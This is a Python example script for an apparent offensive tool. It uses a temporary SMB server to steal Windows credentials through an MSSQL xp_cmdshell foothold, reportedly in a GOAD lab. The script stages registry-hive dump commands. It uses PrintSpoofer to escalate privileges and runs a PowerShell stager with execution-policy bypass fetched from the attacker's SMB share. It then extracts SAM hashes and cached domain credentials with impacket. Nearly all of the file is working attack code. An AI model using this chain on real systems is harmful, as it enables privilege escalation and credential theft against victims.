# This is an example how to use the temporary SMB server to dump the secrets from an impacket-mssqlclient shell
# the environment used was GOAD with the sql_svc user on 192.168.56.23 (no defender)

import logging
from tempsmbserver import TempSMB

from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets

# using the Temporary SMB server as a context manager
with TempSMB(local_ip="192.168.56.106") as smb:
    # creating future objects which we expect to get
    sam = smb.future_file(friendly_name="sam")
    system = smb.future_file(friendly_name="system")
    security = smb.future_file(friendly_name="security")

    # creating the registry commands as a powershell file in the smb server
    sam_dump_payload = f"reg save hklm\\sam {sam.remote_path}\nreg save hklm\\security {security.remote_path}\nreg save hklm\\system {system.remote_path}"
    sam_dump_file = smb.create_temp_file(sam_dump_payload, ext=".ps1")

    # copying the printspoofer executable into the temporary smb server and creating a powershell command to run it
    print_spoofer_file = smb.create_temp_file_from_file("/home/kali/potatos/PrintSpoofer64.exe")
    stager = f'{print_spoofer_file.remote_path} -c "powershell.exe -ep bypass {sam_dump_file.remote_path}"'
    stager_file = smb.create_temp_file(stager, ext=".ps1")

    # creating the xp_cmdshell command to be run in the impacket-mssqlclient shell
    print("run this on your mssql shell:")
    print(f"xp_cmdshell powershell.exe -ep bypass {stager_file.remote_path}")

    # awaiting the future files to actually be written to the smb server
    sam.await_me()
    system.await_me()
    security.await_me()
    print(f'SAM received at {smb["sam"].local_path} - {smb["sam"].exists()}')
    print(f'SYSTEM received at {smb["system"].local_path} - {system.exists()}')
    print(f'SECURITY received at {security.local_path} - {security.exists()}')

    # basic secretsdump code with impacket
    logging.getLogger().setLevel(logging.INFO)

    local_ops = LocalOperations(system.local_path)
    boot_key = local_ops.getBootKey()
    sam_hashes = SAMHashes(sam.local_path, boot_key)
    lsa_secrets = LSASecrets(security.local_path, boot_key)
    print("="*10+"SAM"+"="*10)
    sam_hashes.dump()
    print("=" * 10 + "CHACHED CREDS" + "=" * 10)
    lsa_secrets.dumpCachedHashes()
    print("=" * 10 + "SECRETS" + "=" * 10)
    # commented out for cleaner terminal output
    #lsa_secrets.dumpSecrets()

    sam_hashes.finish()
    lsa_secrets.finish()
